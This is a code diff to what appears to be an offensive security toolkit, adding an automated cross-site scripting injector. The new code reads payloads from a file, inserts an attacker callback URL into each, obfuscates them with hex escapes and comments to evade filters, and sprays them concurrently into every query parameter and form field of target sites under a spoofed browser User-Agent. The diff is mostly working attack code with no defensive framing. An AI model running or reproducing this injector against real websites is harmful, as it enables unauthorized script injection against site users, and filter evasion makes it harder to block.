@@ -37,11 +37,14 @@ import requests
 import tempfile
 import threading
 import subprocess
+import urllib.parse
 import urllib.request
 import importlib.util
 from itertools import product
+from bs4 import BeautifulSoup
 from libnmap.parser import NmapParser
 from libnmap.process import NmapProcess
+from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import quote, unquote, urlparse
 from modules.lazyencoder_decoder import encode, decode
 
@@ -70,6 +73,7 @@ NOBANNER = False
 COMMAND = None
 RUN_AS_ROOT = False
 os.environ['OPENSSL_CONF'] = '/usr/lib/ssl/openssl.cnf'
+global payload_url, target_domain, concurrency, request_timeout, include_subdomains
 BANNER = f"""{GREEN}{BG_BLACK}
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠴⠶⠖⠒⠛⠛⠀⠀⠀⠒⠒⢰⠖⢠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣭⠷⠞⠉⠫⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠈⠉⠒⠲⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -444,7 +448,7 @@ def activate_virtualenv(venv_path):
 
     # Captura la salida del proceso hijo
     stdout, stderr = process.communicate()
-    print_msg(f"Entorno Activado.{RESET}")
+    print_msg(f"Environment Activated.{RESET}")
 
 
 def parse_proc_net_file(file_path):
@@ -1329,6 +1333,91 @@ def get_credentials():
 
     return credentials
 
+def obfuscate_payload(payload):
+    obfuscated = ""
+    for i, c in enumerate(payload):
+        if i > 0 and i % 3 == 0:
+            obfuscated += f"/*{hex(ord(c))}*/"
+        else:
+            obfuscated += f"\\x{hex(ord(c))[2:]}"
+    return obfuscated
+
+def read_payloads(file_path):
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+
+    payloads = [line.strip() if line.startswith('"') else f'"{line.strip()}"' for line in lines]
+    return payloads
+
+def inject_payloads(urls, payload_url, request_timeout=15):
+    payloads = read_payloads('modules/XssPayloads.txt')
+    
+    def send_request(raw_url):
+        try:
+            if not raw_url.startswith(('http://', 'https://')):
+                raw_url = 'http://' + raw_url
+            parsed_url = urllib.parse.urlparse(raw_url)
+            query_params = urllib.parse.parse_qs(parsed_url.query)
+
+            if not query_params:
+                for payload in payloads:
+                    obfuscated_payload = obfuscate_payload(payload.format(payload_url))
+                    full_url = f"{raw_url}?xss={obfuscated_payload}"
+                    print_msg(f"[INFO] Sending request to {full_url}")
+                    resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
+                    resp.raise_for_status()
+                    handle_forms(resp.content, full_url)
+                return
+            
+            for key in query_params:
+                for payload in payloads:
+                    obfuscated_payload = obfuscate_payload(payload.format(payload_url))
+                    query_params[key] = obfuscated_payload
+
+            updated_query = urllib.parse.urlencode(query_params, doseq=True)
+            full_url = parsed_url._replace(query=updated_query).geturl()
+            print_msg(f"[INFO] Sending request to {full_url}")
+            resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
+            resp.raise_for_status()
+            handle_forms(resp.content, full_url)
+        except requests.RequestException as e:
+            print_warn(f"[WARN] Request failed for {raw_url}: {e}")
+
+    def handle_forms(content, url):
+        soup = BeautifulSoup(content, 'html.parser')
+        forms = soup.find_all('form')
+
+        if not forms:
+            print_msg("[INFO] No forms found.")
+            return
+
+        for form in forms:
+            action = form.get('action', url)
+            if action.startswith('/'):
+                action = urllib.parse.urljoin(url, action)
+
+            method = form.get('method', 'GET').upper()
+            form_data = {input.get('name'): payloads[0].format(payload_url) for input in form.find_all('input') if input.get('name')}
+            if not form_data:
+                print_warn("[WARN] No input fields found in form.")
+                continue
+
+            try:
+                if method == 'POST':
+                    resp = requests.post(action, data=form_data, headers={'User-Agent': 'Mozilla/5.0'})
+                else:
+                    resp = requests.get(action, params=form_data, headers={'User-Agent': 'Mozilla/5.0'})
+
+                print_msg(f"[INFO] Form submission response from {action}: {resp.status_code}")
+            except requests.RequestException as e:
+                print_error(f"[ERROR] Failed to submit form at {action}: {e}")
+
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        executor.map(send_request, urls)
+
+def prompt(label, default=None):
+    value = input(f"    {GREEN}{label}: ").strip()
+    return value if value else default
 
 signal.signal(signal.SIGINT, signal_handler)
 arguments = sys.argv[1:]  
